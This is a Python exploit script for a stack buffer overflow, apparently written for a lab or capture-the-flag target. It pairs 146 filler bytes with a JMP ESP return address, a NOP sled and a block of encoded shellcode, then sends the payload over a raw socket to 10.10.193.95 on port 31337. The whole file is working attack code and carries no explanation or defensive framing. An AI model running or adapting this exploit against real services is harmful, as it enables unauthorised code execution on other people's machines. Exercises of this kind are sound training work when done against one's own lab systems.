"""uses 080414C3 address (JMP ESP) to jump to shellcode"""

import socket

# define shellcode
buf =  b""
buf += b"\xd9\xc9\xba\x1d\x39\x0f\xed\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\xdb\x3d\xed"
buf += b"\x18\x1f\xd5\x73\xe2\xdf\x26\x14\x6a\x3a\x17\x14\x08"
buf += b"\x4f\x08\xa4\x5a\x1d\xa5\x4f\x0e\xb5\x3e\x3d\x87\xba"
buf += b"\xf7\x88\xf1\xf5\x08\xa0\xc2\x94\x8a\xbb\x16\x76\xb2"
buf += b"\x73\x6b\x77\xf3\x6e\x86\x25\xac\xe5\x35\xd9\xd9\xb0"
buf += b"\x85\x52\x91\x55\x8e\x87\x62\x57\xbf\x16\xf8\x0e\x1f"
buf += b"\x99\x2d\x3b\x16\x81\x32\x06\xe0\x3a\x80\xfc\xf3\xea"
buf += b"\xd8\xfd\x58\xd3\xd4\x0f\xa0\x14\xd2\xef\xd7\x6c\x20"
buf += b"\x8d\xef\xab\x5a\x49\x65\x2f\xfc\x1a\xdd\x8b\xfc\xcf"
buf += b"\xb8\x58\xf2\xa4\xcf\x06\x17\x3a\x03\x3d\x23\xb7\xa2"
buf += b"\x91\xa5\x83\x80\x35\xed\x50\xa8\x6c\x4b\x36\xd5\x6e"
buf += b"\x34\xe7\x73\xe5\xd9\xfc\x09\xa4\xb5\x31\x20\x56\x46"
buf += b"\x5e\x33\x25\x74\xc1\xef\xa1\x34\x8a\x29\x36\x3a\xa1"
buf += b"\x8e\xa8\xc5\x4a\xef\xe1\x01\x1e\xbf\x99\xa0\x1f\x54"
buf += b"\x59\x4c\xca\xfb\x09\xe2\xa5\xbb\xf9\x42\x16\x54\x13"
buf += b"\x4d\x49\x44\x1c\x87\xe2\xef\xe7\x40\x07\xf8\xe3\x14"
buf += b"\x7f\xfa\xeb\x15\x1d\x73\x0d\x7f\x0d\xd2\x86\xe8\xb4"
buf += b"\x7f\x5c\x88\x39\xaa\x19\x8a\xb2\x59\xde\x45\x33\x17"
buf += b"\xcc\x32\xb3\x62\xae\x95\xcc\x58\xc6\x7a\x5e\x07\x16"
buf += b"\xf4\x43\x90\x41\x51\xb5\xe9\x07\x4f\xec\x43\x35\x92"
buf += b"\x68\xab\xfd\x49\x49\x32\xfc\x1c\xf5\x10\xee\xd8\xf6"
buf += b"\x1c\x5a\xb5\xa0\xca\x34\x73\x1b\xbd\xee\x2d\xf0\x17"
buf += b"\x66\xab\x3a\xa8\xf0\xb4\x16\x5e\x1c\x04\xcf\x27\x23"
buf += b"\xa9\x87\xaf\x5c\xd7\x37\x4f\xb7\x53\x47\x1a\x95\xf2"
buf += b"\xc0\xc3\x4c\x47\x8d\xf3\xbb\x84\xa8\x77\x49\x75\x4f"
buf += b"\x67\x38\x70\x0b\x2f\xd1\x08\x04\xda\xd5\xbf\x25\xcf"

# nop sled
nops = b"\x90" * 10

filler = ("A" * 146).encode("utf-8")
eip = b"\xc3\x14\x04\x08"
#offset = ("C" * 4).encode("utf-8")
line_feed = ("\n").encode("utf-8")

input = filler + eip + nops + buf + line_feed

print(input)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.193.95",31337))
s.send(input)
s.close()
print("done");